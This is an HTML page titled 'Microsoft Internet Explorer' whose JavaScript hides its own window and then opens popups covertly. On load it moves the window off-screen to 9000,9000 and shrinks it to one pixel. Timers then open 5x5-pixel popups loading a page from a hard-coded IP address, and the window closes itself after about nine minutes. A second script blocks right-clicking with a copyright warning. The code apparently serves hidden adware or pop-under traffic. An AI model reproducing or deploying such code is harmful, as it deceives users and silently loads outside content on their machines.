<html>
<head>
	<title>Microsoft Internet Explorer</title>
</head>

<SCRIPT LANGUAGE="JavaScript">
<!--

function hideme(test){
	if (test == 1) return;

	var xval;
	var yval;

	if(nameCode == 1){
		// IE
		xval = self.screenLeft;
		yval = self.screenTop;
	}else{
		// NN
		xval = self.screenX;
		yval = self.screenY;
	}

	if (xval < 9000 || xval == null){
		self.blur();
		self.moveTo(9000,9000);
		self.resizeTo(1,1);
		self.blur();
	}
}


function bName() {
  if (navigator.appName == "Microsoft Internet Explorer")
    return 1;
  if (navigator.appName == "Netscape")
    return 2;
  return 0;
}


var nameCode	= bName();
var height		= screen.height;
var width 		= screen.width;
var today		= new Date();

hideme();

var delay	= new Array();
var url = new Array() ;
var params = new Array() ;

delay[0] = 60 ;

url[0] = 'http://66.28.46.60/pop4.htm' ;
// "height=" + height[count] + ",width=" + width[count] + ",left=" + left[count] + ",top=" + top[count];
params[0] = "width=5,height=5,pageXOffset=0,pageYOffset=0,left=300,top=0,directories=no,location=no,menubar=no,resizable=no,scrollbars=no,status=no,toolbar=no,copyhistory=no";

delay[1] = 240 ;
url[1] = 'http://66.28.46.60/pop4.htm' ;
params[1] = "width=5,height=5,pageXOffset=0,pageYOffset=0,left=0,top=0,directories=no,location=no,menubar=no,resizable=no,scrollbars=no,status=no,toolbar=no,copyhistory=no";

delay[2] = 240 ;
url[2] = 'http://66.28.46.60/pop4.htm' ;
params[2] = "width=5,height=5,pageXOffset=10,pageYOffset=10,left=10,top=10,directories=no,location=no,menubar=no,resizable=no,scrollbars=no,status=no,toolbar=no,copyhistory=no";


var timeme = 0 ;

function Popup() {

	theNum = Math.random() * 2;
//	alert (theNum) ;
	
	theNum2 = Math.round(theNum);
//	alert (theNum2) ;
	
	winName = "win" + theNum2;
//	alert (winName) ;
	
//	alert (" url: " + url[theNum2]) ;
	
	window.open(url[theNum2], winName, params[theNum2]);
} 

for (i=0;i<=2;i++) {
	timeme = delay[i] + timeme;
	setTimeout('Popup()', timeme * 1000);
}

setTimeout('self.close()', 541 * 1000);
-->
</script>


<script language=JavaScript>
 <!--
 
 
 var message="Sorry, this function is disabled.  Our work is protected by several patents and copyrights.";
 function click(e) {
 if (document.all) {
 if (event.button==2||event.button==3) {
 alert(message);
 return false;
 }
 }
 if (document.layers) {
 if (e.which == 3) {
 alert(message);
 return false;
 }
 }
 }
 if (document.layers) {
 document.captureEvents(Event.MOUSEDOWN);
 }
 document.onmousedown=click;
 // --> 
 </script>


<body bgcolor=cccccc onLoad="hideme();">
</html>